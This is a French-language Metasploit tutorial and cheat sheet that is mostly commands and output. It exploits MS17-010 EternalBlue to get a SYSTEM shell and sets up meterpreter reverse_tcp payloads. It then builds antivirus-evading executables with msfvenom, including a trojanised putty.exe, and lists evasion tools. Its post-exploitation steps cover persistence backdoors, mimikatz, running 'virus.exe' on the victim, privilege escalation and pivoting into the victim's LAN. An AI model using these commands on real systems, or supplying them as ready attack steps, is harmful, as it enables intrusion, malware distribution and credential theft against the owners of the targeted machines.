METASPLOIT
==========

**Source** : https://k-lfa.info/metasploit-cheat-sheet/

Metasploit est un outil pour le développement et l’exécution d'exploits sur une machine distante. Des outils tierces ont été intégrés (nmap, nessus, msfvenom, ...).
De ce fait tout le process d'analyse de port, de vulnérabilité et d'exploitation peut être effectué à partir d'un seul outil. 
Metasploit a intègré aussi une base de données postgresql pour stocker les données collectées à partir de vos analyses et exploits.

Interfaces
----------

Metasploit a plusieurs interfaces :

- **msfconsole** une interface en ligne de commande interactive
- **msfcli** une interface en ligne de commande (pour automatiser)
- **Armitage** Une GUI en Java pour l'utilisation de Metasploit
- **msfweb** Interface web de l'outil

*Metasploit dispose de plusieurs types de modules important à connaître pour être efficace.*

- **Exploits** : Moyen d'infiltration sur un hôte distant (Service ou application en ligne)
- **Auxiliary** : Module de test à la vulnérabilité (Scan, analyse, DoS, ...)
- **Encoder** : ré-encodeur de payloads pour passer les antivirus et soft de sécurité
- **NOP** : Lorsqu'un  processeur charge cette instruction, il ne fait simplement rien (au  moins utile) pendant un cycle, puis avance le registre à l'instruction  suivante
- **POST** : Script utile après l'exploitation (Keylogger, hashdump, élévation de privilège, webcam, ...)
- **Payloads** : Charge (Morceau de code) utile à faire exécuter au système cible (3 types de payloads 

Payloads
--------

1. **Singles** : Petit code autonome pour une action unique
2. **Stagers** : Ouvre un canal de communication pour fournir une autre charge pour controler le système
3. **Stages** : Charge additionnelle pour controler la cible (meterpreter, VNC, ...)

*Tout ces modules / scripts sont disponibles dans /usr/share/metasploit-framework/modules/*

.. code-block:: bash
  :linenos:

  ls -l /usr/share/metasploit-framework/modules/

  auxiliary
  encoders
  exploits
  nops
  payloads
  post

Lancer metasploit
-----------------

.. code-block:: bash
  :linenos:

  systemctl posqtgresql start
  msfconsole

Exploiter une vulnérabilité
---------------------------

Admettons que nous ayons détecté une vulnérabilité avec nmap sur un hôte windows

.. code-block:: bash
  :linenos:

  $nmap --script vuln 192.168.1.103 -oN /root/VulnScan.txt

  smb-vuln-ms17-010: 

  |   VULNERABLE: 
  |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) 
  |     State: VULNERABLE 
  |     IDs:  CVE:CVE-2017-0143 
  |     Risk factor: HIGH 
  |       A critical remote code execution vulnerability exists in Microsoft SMBv1 
  |        servers (ms17-010)

Une vulnérabilité lié à SMBv1 non à jours (ms17-010), pour l'exploiter :

.. code-block:: bash
  :linenos:

  $search ms17-010

  Matching Modules

  Name                                           Disclosure Date  Rank     Check  Description

  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution

Les modules "auxiliary" ne sont que des scans, ayant déjà identifié la vulnérabilité nous utiliserons "l'exploit"

.. code-block:: bash
  :linenos:

  $use exploit/windows/smb/ms17_010_eternalblue
  $show options
  
  Name           Current Setting  Required  Description
     ----           ---------------  --------  -----------
     RHOST                           yes       The target address
     RPORT          445              yes       The target port (TCP)
     SMBDomain      .                no        (Optional) The Windows domain to use for authentication
     SMBPass                         no        (Optional) The password for the specified username
     SMBUser                         no        (Optional) The username to authenticate as
     VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
     VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
  
  $set RHOST 192.168.1.103

En lançant simplement l'exploit nous arrivons sur la cible avec un shell DOS sous **AUTHORITE NT\System**

.. code-block:: bash
  :linenos:

  $exploit
  
  C:\Windows\system32>
  C:\Windows\system32>whoami
  
  AUTHORITE NT\System

Nous somme connecté sur la machine distante mais impossible de charger des modules depuis metasploit pour cela ajoutez un payload reverse tcp dans l'exploit

.. code-block:: bash
  :linenos:

  $show payloads
  
  Compatible Payloads
  
  Name                                        Disclosure Date  Rank    Check  Description
  
  generic/custom                                               normal  No     Custom Payload
  generic/shell_bind_tcp                                       normal  No     Generic Command Shell, Bind TCP Inline
  generic/shell_reverse_tcp                                    normal  No     Generic Command Shell, Reverse TCP Inline
  windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
  windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
  windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
  
  $set payload windows/x64/meterpreter/reverse_tcp
  $exploit
  
  
  meterpreter>

.. note:: Dans ce cas la c'est la victime qui se connecte sur notre machine, le principe est maintenant d’exécuter de la post exploitation

.. attention:: Attention l’exécution de payload peut être détecté avec l'anvirus/antimalware (l'efficacité est de le tester avant sur plusieurs antivirus)

Bypass antivirus
----------------

Metasploit embarque la possibilité de modifier un payload et de le rendre plus difficilement détectable par les antivirus. L'outil se nomme msfvenom

.. code-block:: bash
  :linenos:

  $msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.10 LHOST=443 -e x64/xor_dynamic -i 3 -f exe -o Surprise.exe
  
  -p est le payload à injecter dans l\'executable LHOST est l\'hôte auquel la victime se connectera / LPORT est le port auquel la victime se connectera
  -e est l\'encodage du payload (x64/xor_dynamic dans l\'exemple)
  -i nombre d\'iteration (nombre de ré-encodage du payload)
  -f est le format du fichier généré (exe dans l\'exemple)
  -o Surprise.exe est le fichier généré

Il est aussi possible d'injecter une charge dans un soft déjà existant (par exemple putty)

.. code-block:: bash
  :linenos:

  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=443 --encrypt aes256 -e x64/xor_dynamic -i 3 -f exe -x putty.exe -k -o PuttyMalicious.exe
  
  --encrypt pour encrypter le payload (Peut causer des instabilités)
  -x Fichier source auquel injecter le payload
  -k pour preserver le code du fichier source (pour qu\'il puisse fonctionner en plus du payload)

.. note:: Le nombres d'itérations, l'encodage, encryptage et le payload jouerons sur l’efficacité de l'attaque. La pluparts des payloads restent quand même connus des gros antivirus (windows defender, avats, kaspersky, ...)

La meilleure solution est de créer son propre payload pour avoir une signature non connu

De nombreux outils existent pour générer des payloads :

- Veil-Evasion https://github.com/Veil-Framework/Veil-Evasion
- Phantom-Evasion https://github.com/oddcod3/Phantom-Evasion
- Hercules https://github.com/EgeBalci/HERCULES
- Fatrat https://github.com/Exploit-install/TheFatRat
- Unicorn https://github.com/trustedsec/unicorn
- Shellter  ``apt-get install shellter``

Post exploitation
-----------------

La post exploitation permet de charger des modules depuis metasploit (mimikatz, powershell, python, sniffer, ...) ou même de faire agir la victime en point de pivot pour relayer nos attaques sur son réseau local

.. code-block:: bash
  :linenos:

  $search post       #Lister les modules (creds, powershell, webcam, ...)
  $run post/windows/manage/change_password      #Execute le module change password
  $run persistence    #Installe une backdoor persistente sur la victime
  
  $load powershell            #Charger le module powershell sur la victime
  $powershell_shell           #Pour lancer un shell powershell sur la victime
  $powershell_import Owned.ps1        #Charge et execute le script Owned.ps1 sur la victime
  
  $load mimikatz      #Charge le module mimikatz sur la victime

De nombreuses commandes Meterpreter sont disponible (voir l'aide)

.. code-block:: bash
  :linenos:

  lls     #Lister l'emplacement de la machine local
  lcd     #Se déplacer dans l'arborescence de la machine local
  cd      #Se deplacer dans la machine distante
  ls      #Lister l'arborescence de la machine distante
  download secret.txt      #Télécharger le fichier secret.txt de la machine distante
  upload virus.exe         #Envoyer le fichier virus.exe sur la machine distante
  execute virus.exe        #Exectuer virus.exe sur la machine distante
  migrate 308              #Injecter le meterpreter dans le PID 308

.. note:: A savoir que lorsque vous migrez le meterpreter dans un autre processus, si celui-ci est un processus d'un utilisateur standard, le meterpreter aura les droits de l'utilisateur et plus de AuthoriteNT

.. note:: Savoir aussi que si l'utilisateur ferme le processus dans lequel vous êtes injecté, vous perdrez le meterpreter (Conseil injectez le dans les processus systèmes)

Dans le cas ou notre meterpreter ne donnerai pas accès au compte administrateur ou systeme, l'outil Windows-Exploit-Suggester permet de rechercher des exploit en local sur la victime

https://github.com/GDSSecurity/Windows-Exploit-Suggester

.. code-block:: bash
  :linenos:

  #Sur la victime
  
  meterpreter > shell  # Obtenir un shell sur la vicitme
  meterpreter > systeminfo > systeminfo.txt # Récupérer les infos system (KB, info du system)
  meterpreter > download systeminfo.txt  #Telecharger le fichier sur notre mahchine
  meterpreter > rm systeminfo.txt  #Supprimer le fichier sur la machine victime
  
  #Sur notre machine
  python windows-exploit-suggester .py update    #Télécharge le dernier xls d'exploit windows à jours
  python windows-exploit-suggester.py --database 2019-02-05-mssb.xls --systeminfo systeminfo.txt  #Compare le systeminfo généré avec la base d'exploit téléchargée
  
  [M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
  [*]   https://github.com/foxglovesec/RottenPotato
  [*]   https://github.com/Kevin-Robertson/Tater
  [*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
  [*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
  
  [E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
  [*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
  
  [E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
  [*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
  
  [E] MS16-056: Security Update for Windows Journal (3156761) - Critical
  [*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 JavaScript Stack Walker Memory Corruption (MS15-056)
  [*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 JavaScript Stack Walker memory corruption

Créer un point de pivot
-----------------------

L'objectif à travers un point de pivot est d'accéder à des ressources sur un réseau distant.

Une machine infecté et connecté via reverse shell sert de point de relais pour communiquer avec les machines de son réseau. Elle permettra de relayer nos attaques sur son réseau.

.. code-block:: bash
  :linenos:

  #en msfconsole
  
  use auxiliary/server/socks4a
  set LHOST 127.0.0.1  #Utiliser 127.0.0.1 est plus stable
  set LPORT 9050   #Par défaut en 1080 le modifier n'est pas obligatoire
  
  #en meterpreter
  
  run auxiliary/server/socks4a

Ce module ouvre un proxy sur la machine attaquante, pour router le traffic vers la victime.

.. code-block:: bash
  :linenos:

  #en meterpreter ou msfconsole
  
  run post/multi/manage/autoroute
  
  [+] Route added to subnet 192.168.1.0/255.255.255.0 from host\'s routing table

Pour relayer les attaques via le proxy (Il faut que le proxy soit configurer vers le même port configuré dans LPORT précédemment)

``proxychains nmap 192.168.1.0/24 -p 445 -script vuln -oN ScanRemoteNet.txt``

Il est possible d'utiliser le navigateur dans le réseau LAN distant. Configurer le navigateur avec le proxy installé précédemment.

Metasploit Cheat-sheet
----------------------

Changer de session & Jobs

.. code-block:: bash
  :linenos:

  #En meterpreter
  
  jobs        #Afficher les jobs en cours (proxy, ...)
  kill 3      #Arréter le jobs 3
  background  #revenir à la msfconsole
  
  #En msfconsole
  sessions    #Lister les sessions actives
  sessions 3  #Revenir sur le meterpreter de la session 3

Récupérer une connexion d'un hôte infecté

.. code-block:: bash
  :linenos:

  $msfconsole   #Lancer metasploit
  $set payload windows/x64/meterpreter_reverse_tcp    #Payload utilisé dans l'infection (meterpreter_reverse_tcp dans l'exemple
  $set LHOST 192.168.1.11   #Votre IP local ou publique si attaque depuis internet
  $set LPORT 443    #Port local sur lequel se connecte la victime
  $run
  
  [*] Started reverse TCP handler on 192.168.1.11:443 
  [*] Meterpreter session 1 opened (192.168.1.11:443 -> 192.168.1.29:58718) at 2019-02-05 20:37:04 +0100

Module de reconnaissance

.. code-block:: bash
  :linenos:

  #En meterpreter>
  
  #Detecter les hôtes du LAN via ARP
  run post/windows/gather/arp_scanner 
  
  
  #En msfconsole
  
  #Scanner le LAN en port 445
  use auxiliary/scanner/portscan/tcp
  set RHOSTS 192.168.1.0/24
  set RPORTS 445
  exploit
  
  #Detecter les hôtes cisco
  use auxiliary/scanner/http/cisco_device_manager
  set RHOSTS 192.168.1.0/24
  exploit

Navigation local / cible

.. code-block:: bash
  :linenos:

  #En meterpreter
  
  lls  #lister le dossier current en local
  lcd  #Ce déplacer dans les dossier en local
  lpwd #Afficher l'emplacement en local
  
  ls # Lister l'arborescence sur la cible
  cd # ce déplacer dans l'arbo de la cible
  pwd # afficher l'emplacement actuel de la cible
